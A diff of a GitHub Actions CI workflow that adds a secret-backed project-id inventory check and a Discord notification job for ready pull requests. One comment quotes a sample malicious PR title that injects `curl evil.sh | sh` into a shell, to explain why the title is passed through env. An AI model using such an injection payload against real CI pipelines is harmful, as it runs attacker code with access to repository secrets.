@@ -29,13 +29,6 @@ permissions:
   # requirement changed underneath. Read-only, and only what that one call needs.
   pull-requests: read
 
-env:
-  # src/service/discord_listener.py exits during import when these are unset,
-  # which kills pytest collection outright. Placeholders, not secrets — nothing
-  # in the suite connects to Discord.
-  DISCORD_BOT_TOKEN: "ci-placeholder-token"
-  DISCORD_CHANNEL_ID: "123456789"
-
 jobs:
   # GitHub filters paths per *workflow*, not per job, so the obvious
   # `paths-ignore: ["**.md"]` would also switch off the secret scan and the
@@ -218,11 +211,28 @@ jobs:
       #
       # `if: always()` because these two are independent gates that happen to
       # share a job. When the secret scan crashed on 2026-09-07 this was skipped
-      # with it, and CLAUDE.md says both run on every push -- coupling them by
+      # with it, and AGENTS.md says both run on every push -- coupling them by
       # step order was an accident of ordering, not a decision.
       - name: Documentation drift
         if: always()
         run: python scripts/check_doc_drift.py
+
+      # The operator's project ids stay out of this public repository (DG-317).
+      # The local commit hooks cover commits made on a machine with the
+      # registry; this covers every other way in — another machine, GitHub's
+      # "Update branch". The ids come from a secret because the repository must
+      # not hold them, and --require-ids fails an unset secret rather than
+      # reporting an unchecked run as clean. Output names places, never ids.
+      - name: Operator project inventory
+        if: always()
+        env:
+          OPERATOR_PROJECT_IDS: ${{ secrets.OPERATOR_PROJECT_IDS }}
+          RANGE: ${{ github.event_name == 'pull_request' && format('{0}..{1}', github.event.pull_request.base.sha, github.event.pull_request.head.sha) || format('{0}..{1}', github.event.before, github.sha) }}
+        run: |
+          # A new branch reports an all-zero `before`; then the tree is checked
+          # and the messages of the tip commit alone.
+          case "$RANGE" in 0000000000000000000000000000000000000000..*) RANGE="${RANGE#*..}~1..${RANGE#*..}" ;; esac
+          python scripts/check_operator_inventory.py --tree --messages "$RANGE" --require-ids
 
   clean-install:
     name: clean install
@@ -244,3 +254,49 @@ jobs:
       # invisible on an already-configured machine.
       - name: Clean-room verification
         run: ./scripts/verify_clean_install.sh
+
+  # The other half of DG-355: Discord stopped being somewhere to answer and
+  # became somewhere to be told. This is the "PR is ready" half of that, sent
+  # from CI rather than from a daemon watching a socket.
+  #
+  # Deliberately `needs` every gate and `if: success()`. A notification saying a
+  # PR is ready for review, sent while its tests are red, trains the reader to
+  # ignore the next one.
+  #
+  # `continue-on-error` because a notification is never worth failing a build
+  # over — and `core.notify` exits 0 with its reason on stderr in any case, so
+  # an unset DISCORD_WEBHOOK_URL logs "not sent" rather than breaking a fork's
+  # CI, which cannot see repository secrets at all.
+  notify:
+    name: notify
+    runs-on: ubuntu-latest
+    needs: [changes, test, security, clean-install]
+    # Not `success()`: a docs-only pull request *skips* the three code gates,
+    # and a skipped dependency is not a successful one — the notification would
+    # silently never be sent for exactly the changes that most want reviewing.
+    # This says "nothing failed" instead, which is the actual condition.
+    if: >-
+      github.event_name == 'pull_request' && !cancelled()
+      && !contains(needs.*.result, 'failure')
+    continue-on-error: true
+    steps:
+      - uses: actions/checkout@v4
+      - uses: astral-sh/setup-uv@v5
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.13"
+
+      # The title and URL arrive through `env`, never interpolated into the
+      # script. `${{ }}` is substituted before the shell sees the line, so a
+      # pull request titled `"; curl evil.sh | sh; #` would run as this job —
+      # with the repository's secrets in its environment. Anyone can open a
+      # pull request; that makes the title attacker-controlled input.
+      - name: Say the PR is ready
+        env:
+          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
+          DRUNKEN_DISCORD_WEBHOOK: env://DISCORD_WEBHOOK_URL
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_URL: ${{ github.event.pull_request.html_url }}
+        run: |
+          uv run python -m core.notify \
+            "$PR_TITLE — checks green, ready for review" --link "$PR_URL"
